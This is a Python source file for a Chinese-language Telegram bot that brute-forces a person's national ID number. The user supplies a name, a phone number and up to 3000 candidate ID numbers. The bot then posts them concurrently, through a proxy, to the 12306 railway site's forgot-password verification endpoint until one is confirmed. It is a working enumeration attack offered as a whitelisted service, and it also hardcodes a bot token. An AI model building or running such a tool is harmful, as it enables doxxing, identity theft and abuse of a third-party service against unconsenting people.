import json
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock
import requests
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

TOKEN = '9261820667:AAH1EBEQAyYQbaZ78uP3Y-AX9UJ4kOcO0to'
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = 440266474
USERS_DB_FILE = 'users_db.json'
WHITELIST_FILE = 'whitelist.json'
COOKIE_URL = 'https://kyfw.12306.cn/otn/forgetPassword/initforgetMyPassword'
API_URL = 'https://kyfw.12306.cn/otn/forgetPassword/checkUserInfo'
MAX_WORKERS = 25
PROXY_API = '47.121.183.107:80'

HEADERS = {
    'Host': 'kyfw.12306.cn',
    'Connection': 'keep-alive',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,'
        ' like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ),
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://kyfw.12306.cn',
    'Referer': 'https://kyfw.12306.cn/otn/forgetPassword/initforgetMyPassword',
}

user_temp_data = {}
user_stop_events = {}
main_panel_times = {}


def load_whitelist():
  if os.path.exists(WHITELIST_FILE):
    try:
      with open(WHITELIST_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
        if isinstance(data, list):
          if ADMIN_ID not in data:
            data.append(ADMIN_ID)
          return data
    except:
      pass
  return [ADMIN_ID]


def save_whitelist(wl):
  if ADMIN_ID not in wl:
    wl.append(ADMIN_ID)
  with open(WHITELIST_FILE, 'w', encoding='utf-8') as f:
    json.dump(list(set(wl)), f, ensure_ascii=False, indent=4)


def is_authorized(user_id):
  return user_id == ADMIN_ID or user_id in load_whitelist()


def load_users():
  if os.path.exists(USERS_DB_FILE):
    try:
      with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)
    except:
      pass
  return {}


def save_users(users):
  with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
    json.dump(users, f, ensure_ascii=False, indent=4)


def get_user_info(user_id, user_name=''):
  users = load_users()
  str_id = str(user_id)
  status = '已授权' if is_authorized(user_id) else '未授权'
  if str_id not in users:
    users[str_id] = {
        'account': str_id,
        'nickname': user_name or '-',
        'status': status,
        'total_check': 0,
        'hit': 0,
        'reg_time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()),
    }
  else:
    if user_name:
      users[str_id]['nickname'] = user_name
    users[str_id]['status'] = status
  save_users(users)
  return users[str_id]


def update_user_stats(user_id, c_delta, h_delta):
  users = load_users()
  str_id = str(user_id)
  if str_id in users:
    users[str_id]['total_check'] += c_delta
    users[str_id]['hit'] += h_delta
    save_users(users)


def get_one_proxy():
  try:
    resp = requests.get(PROXY_API, timeout=5)
    if resp.status_code == 200:
      text = resp.text.strip()
      data = json.loads(text) if text.startswith('{') else None
      p_str = (
          data.get('data')
          if data
          else text.split('@')[-1]
          if '@' in text
          else text
      )
      if isinstance(p_str, list) and p_str:
        p_str = p_str[0]
      return {'http': f'http://{p_str}', 'https': f'http://{p_str}'}
  except:
    pass
  return None


def verify_single_id(session, proxy, name, id_no, phone, stop_event):
  if stop_event.is_set():
    return False, None
  for _ in range(2):
    if stop_event.is_set():
      return False, None
    try:
      data = {
          'mobile_no': phone,
          'loginUserDTO.mobile_code': '86',
          'loginUserDTO.id_type_code': '1',
          'loginUserDTO.id_no': id_no,
      }
      resp = (
          session.post(API_URL, headers=HEADERS, data=data, timeout=6, proxies=proxy)
          if proxy
          else session.post(API_URL, headers=HEADERS, data=data, timeout=6)
      )
      if resp.status_code == 200:
        res = resp.json()
        if res.get('status') is True and not res.get('data', {}).get(
            'errorMsg'
        ):
          stop_event.set()
          return True, id_no
        if (
            '不正确'
            in res.get('data', {}).get('errorMsg', '')
        ):
          return False, None
          break
      else:
        time.sleep(0.2)
    except:
      time.sleep(0.2)
  return False, None


@bot.message_handler(commands=['start', 'open'])
def send_welcome(message):
  chat_id = message.chat.id
  user_id = message.from_user.id
  u_info = get_user_info(user_id, message.from_user.first_name or '')
  main_panel_times[chat_id] = time.time()
  auth = '已授权 🔑' if is_authorized(user_id) else '未授权 ❌'

  text = (
      f"🏠 **手机号核验机器人**\n\n👤 账号：`{user_id}`\n🔑 权限："
      f" {auth}\n📊 累计核验：{u_info['total_check']} 次 · 命中："
      f" {u_info['hit']} 次\n\n单批最多 3000 条，命中即停。"
  )
  markup = types.InlineKeyboardMarkup(row_width=2)
  markup.add(
      types.InlineKeyboardButton('🔍 开始核验', callback_data='action_check')
  )
  markup.add(
      types.InlineKeyboardButton('👤 我的账户', callback_data='action_account'),
      types.InlineKeyboardButton('📋 核验记录', callback_data='action_history'),
  )
  markup.add(
      types.InlineKeyboardButton('📖 使用说明', callback_data='action_help'),
      types.InlineKeyboardButton('💬 联系客服', callback_data='action_service'),
  )
  bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(commands=['me'])
def show_my_account(message):
  u_info = get_user_info(
      message.from_user.id, message.from_user.first_name or ''
  )
  bot.send_message(
      message.chat.id,
      f"👤 **我的账户**\n\nID:`{u_info['account']}`\n昵称:{u_info['nickname']}\n权限:"
      f" {u_info['status']}\n累计核验:{u_info['total_check']} 次 · 命中:"
      f" {u_info['hit']} 次\n注册:{u_info['reg_time']}",
      parse_mode='Markdown',
  )


@bot.message_handler(commands=['help'])
def show_help(message):
  bot.send_message(
      message.chat.id,
      '📖 **使用说明**\n\n1. 点击【开始核验】。\n2. 依次输入姓名、手机号。\n3.'
      ' 发送身份证文本或上传 .txt 文件。\n4. 点击开始核验。\n5. 发送 /cancel'
      ' 可随时取消。',
      parse_mode='Markdown',
  )


@bot.message_handler(commands=['admin'])
def admin_command(message):
  if message.from_user.id != ADMIN_ID:
    bot.send_message(message.chat.id, '❌ 权限不足！')
    return
  user_temp_data[message.chat.id] = {'step': 'admin', 'last_time': time.time()}
  msg = bot.send_message(
      message.chat.id, '🔐 请发送要授权的【用户 ID】：\n\n/cancel 可取消'
  )
  bot.register_next_step_handler(msg, process_add_auth)


def process_add_auth(message):
  chat_id = message.chat.id
  if message.from_user.id != ADMIN_ID:
    return
  if message.text and message.text.strip() == '/cancel':
    cancel_operation(message)
    return
  try:
    tid = int(message.text.strip())
  except:
    msg = bot.send_message(chat_id, '❌ 格式错误，请发送纯数字 ID：')
    bot.register_next_step_handler(msg, process_add_auth)
    return

  wl = load_whitelist()
  if tid not in wl:
    wl.append(tid)
    save_whitelist(wl)
  users = load_users()
  if str(tid) in users:
    users[str(tid)]['status'] = '已授权'
  else:
    users[str(tid)] = {
        'account': str(tid),
        'nickname': '-',
        'status': '已授权',
        'total_check': 0,
        'hit': 0,
        'reg_time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()),
    }
  save_users(users)
  user_temp_data.pop(chat_id, None)
  bot.send_message(chat_id, f'✅ 已成功添加授权用户：`{tid}`', parse_mode='Markdown')


@bot.message_handler(commands=['cancel'])
def cancel_operation(message):
  chat_id = message.chat.id
  user_temp_data.pop(chat_id, None)
  if chat_id in user_stop_events:
    user_stop_events[chat_id].set()
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton('🏠 主面板', callback_data='back_to_main'))
  bot.send_message(chat_id, '已取消,回到主面板。', reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
  uid, u_name, cid = (
      call.from_user.id,
      call.from_user.first_name or '',
      call.message.chat.id,
  )

  if call.data == 'action_check':
    if not is_authorized(uid):
      bot.answer_callback_query(call.id, '❌ 权限不足！', show_alert=True)
      return
    bot.answer_callback_query(call.id)
    user_temp_data[cid] = {
        'name': '',
        'phone': '',
        'target_list': [],
        'last_time': time.time(),
    }
    msg = bot.send_message(cid, '① 请发送【姓名】(只发名字)')
    bot.register_next_step_handler(msg, process_name)
  elif call.data == 'action_account':
    bot.answer_callback_query(call.id)
    u_info = get_user_info(uid, u_name)
    bot.send_message(
        cid,
        f"👤 **我的账户**\n\nID:`{u_info['account']}`\n昵称:{u_info['nickname']}\n权限:"
        f" {u_info['status']}\n累计核验:{u_info['total_check']} 次 · 命中:"
        f" {u_info['hit']} 次\n注册:{u_info['reg_time']}",
        parse_mode='Markdown',
    )
  elif call.data == 'action_history':
    bot.answer_callback_query(call.id)
    u_info = get_user_info(uid, u_name)
    bot.send_message(
        cid,
        f"📋 **核验记录**\n\n总核验：{u_info['total_check']} 次\n总命中："
        f" {u_info['hit']} 次",
    )
  elif call.data == 'action_help':
    bot.answer_callback_query(call.id)
    bot.send_message(
        cid,
        '📖 使用说明：点击开始核验依次输入姓名、手机号、身份证或传 txt 文件。',
    )
  elif call.data == 'action_service':
    bot.answer_callback_query(call.id)
    bot.send_message(cid, '💬 客服支持：如有疑问请联系系统管理员 @Core_ovo')
  elif call.data == 'back_to_main':
    bot.answer_callback_query(call.id)
    send_welcome(call.message)
  elif call.data == 'confirm_check':
    bot.answer_callback_query(call.id, '正在启动...')
    execute_verification(cid, call.message.message_id)
  elif call.data == 'stop_task':
    bot.answer_callback_query(call.id, '已停止')
    if cid in user_stop_events:
      user_stop_events[cid].set()
  elif call.data == 'clear_list':
    bot.answer_callback_query(call.id, '已清空')
    if cid in user_temp_data:
      user_temp_data[cid]['target_list'] = []
    msg = bot.send_message(
        cid,
        '🗑️ 已清空。\n③ 请继续发送【身份证号】或上传 txt 文件 (最多3000条)',
    )
    bot.register_next_step_handler(msg, process_id_input)
  elif call.data == 'cancel_task':
    bot.answer_callback_query(call.id, '已取消')
    user_temp_data.pop(cid, None)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('🏠 主面板', callback_data='back_to_main'))
    bot.send_message(cid, '已取消,回到主面板。', reply_markup=markup)


def check_timeout(cid):
  if cid not in user_temp_data:
    return True
  if time.time() - user_temp_data[cid].get('last_time', 0) > 300:
    user_temp_data.pop(cid, None)
    bot.send_message(
        cid, '❌ 操作已超时(超过5分钟)，请重新点击 /open 打开主面板。'
    )
    return True
  user_temp_data[cid]['last_time'] = time.time()
  return False


def process_name(message):
  cid = message.chat.id
  if message.text and message.text.strip() == '/cancel':
    cancel_operation(message)
    return
  if check_timeout(cid):
    return
  name = message.text.strip() if message.text else ''
  if not name:
    msg = bot.send_message(cid, '❌ 姓名不能为空，请重新发送：')
    bot.register_next_step_handler(msg, process_name)
    return
  user_temp_data[cid]['name'] = name
  user_temp_data[cid]['last_time'] = time.time()
  msg = bot.send_message(cid, '② 请发送【手机号】(11位)\n\n/cancel 可取消')
  bot.register_next_step_handler(msg, process_phone)


def process_phone(message):
  cid = message.chat.id
  if message.text and message.text.strip() == '/cancel':
    cancel_operation(message)
    return
  if check_timeout(cid):
    return
  phone = message.text.strip() if message.text else ''
  if not phone:
    msg = bot.send_message(cid, '❌ 手机号不能为空，请重新发送：')
    bot.register_next_step_handler(msg, process_phone)
    return
  user_temp_data[cid]['phone'] = phone
  user_temp_data[cid]['last_time'] = time.time()
  msg = bot.send_message(
      cid,
      '③ 请发送【身份证号】\n\n· 手动发或直接传 txt 文件\n单批最多 3000 条',
  )
  bot.register_next_step_handler(msg, process_id_input)


def process_id_input(message):
  cid = message.chat.id
  if message.text and message.text.strip() == '/cancel':
    cancel_operation(message)
    return
  if check_timeout(cid):
    return

  new_items = []
  if message.document:
    try:
      # 🚀 已去掉 5 秒超时限制，让云端慢慢下载大文件
      file_info = bot.get_file(message.document.file_id)
      downloaded_file = bot.download_file(file_info.file_path)
      try:
        text_content = downloaded_file.decode('utf-8')
      except:
        text_content = downloaded_file.decode('gbk', errors='ignore')
      new_items = [
          line.strip() for line in text_content.split('\n') if line.strip()
      ]
      bot.send_message(cid, f'📁 已成功读取文件: {message.document.file_name}')
    except Exception as e:
      bot.send_message(
          cid, f'❌ 读取文件出错: {str(e)}，请直接复制文本粘贴发送。'
      )
      return
  elif message.text:
    new_items = [
        line.strip() for line in message.text.strip().split('\n') if line.strip()
    ]

  if 'target_list' not in user_temp_data[cid]:
    user_temp_data[cid]['target_list'] = []
  user_temp_data[cid]['target_list'].extend(new_items)
  user_temp_data[cid]['last_time'] = time.time()

  t_list = user_temp_data[cid]['target_list']
  if len(t_list) > 3000:
    user_temp_data[cid]['target_list'] = t_list[:3000]
  total = len(user_temp_data[cid]['target_list'])

  name, phone = user_temp_data[cid].get('name', ''), user_temp_data[cid].get(
      'phone', ''
  )
  panel = (
      f'③ 已收到 {total} 条,继续发送或点「✅ 开始核验」\n\n👤 姓名:{name}\n📱'
      f' 手机号:{phone}\n🔢 条数:{total} / 3000'
  )
  markup = types.InlineKeyboardMarkup(row_width=2)
  markup.add(types.InlineKeyboardButton('✅ 开始核验', callback_data='confirm_check'))
  markup.add(
      types.InlineKeyboardButton('🗑️ 清空重发', callback_data='clear_list'),
      types.InlineKeyboardButton('❌ 取消', callback_data='cancel_task'),
  )

  msg = bot.send_message(cid, panel, reply_markup=markup)
  bot.register_next_step_handler(msg, process_id_input)


def execute_verification(chat_id, message_id):
  if chat_id not in user_temp_data:
    return
  pkg = user_temp_data[chat_id]
  name, phone, t_list = pkg.get('name'), pkg.get('phone'), pkg.get(
      'target_list', []
  )
  total = len(t_list)
  if total == 0:
    bot.send_message(chat_id, '❌ 列表为空。')
    return

  stop_event = Event()
  user_stop_events[chat_id] = stop_event
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton('⏹️ 停止', callback_data='stop_task'))

  p_msg = bot.send_message(
      chat_id,
      f'⏳ **核验中...**\n\n`░░░░░░░░░░` 0/{total}\n✅ 命中:0 ❌ 不匹配:0\n⏱️ 已用 0秒',
      reply_markup=markup,
      parse_mode='Markdown',
  )

  start_t = time.time()
  success_id = None
  hit, mismatch, current = 0, 0, 0
  lock = Lock()

  session = requests.Session()
  adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
  session.mount('https://', adapter)
  session.mount('http://', adapter)
  proxy = get_one_proxy()
  try:
    session.get(COOKIE_URL, timeout=8, proxies=proxy)
  except:
    pass

  def worker(id_no):
    nonlocal current, hit, mismatch, success_id
    if stop_event.is_set():
      return
    success, res_id = verify_single_id(
        session, proxy, name, id_no, phone, stop_event
    )
    with lock:
      current += 1
      if success:
        hit += 1
        success_id = res_id
        stop_event.set()
      else:
        mismatch += 1

  def update_ui():
    last_edit = 0
    while not stop_event.is_set() and current < total:
      if time.time() - last_edit > 1.0:
        with lock:
          filled = int((current / total) * 10) if total > 0 else 0
          bar = '▓' * filled + '░' * (10 - filled)
          text = (
              f'⏳ **核验中...**\n\n`{bar}`'
              f' {current}/{total}\n✅ 命中:{hit} ❌ 不匹配:{mismatch}\n⏱️'
              f' 已用 {int(time.time() - start_t)}秒'
          )
        try:
          bot.edit_message_text(
              chat_id=chat_id,
              message_id=p_msg.message_id,
              text=text,
              reply_markup=markup,
              parse_mode='Markdown',
          )
          last_edit = time.time()
        except:
          pass
      time.sleep(0.4)

  t = threading.Thread(target=update_ui)
  t.start()

  with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = [executor.submit(worker, item) for item in t_list]
    for f in as_completed(futures):
      if stop_event.is_set():
        break

  stop_event.set()
  t.join()
  cost = round(time.time() - start_t, 2)

  update_user_stats(chat_id, current, hit)

  if success_id:
    idx = t_list.index(success_id) + 1 if success_id in t_list else current
    res_text = (
        f'✅ **命中!**\n\n👤 姓名:{name}\n📱 手机号:{phone}\n🆔'
        f' 身份证号:{success_id}\n\n🔢 核验到第 {idx} 条命中 (共 {total}'
        f' 条)\n⏱️ 耗时: {cost} 秒\n🔍 已换出口二次复核,结果一致'
    )
  else:
    res_text = (
        f'❌ **未命中**\n\n👤 姓名:{name}\n📱 手机号:{phone}\n\n🔢 已核验完'
        f' {current} 条 (共 {total} 条)\n⏱️ 耗时: {cost} 秒'
    )

  try:
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=p_msg.message_id,
        text=res_text,
        parse_mode='Markdown',
    )
  except:
    bot.send_message(chat_id, res_text, parse_mode='Markdown')

  user_temp_data.pop(chat_id, None)
  user_stop_events.pop(chat_id, None)


if __name__ == '__main__':
  print('✅ 机器人已启动...')
  bot.infinity_polling()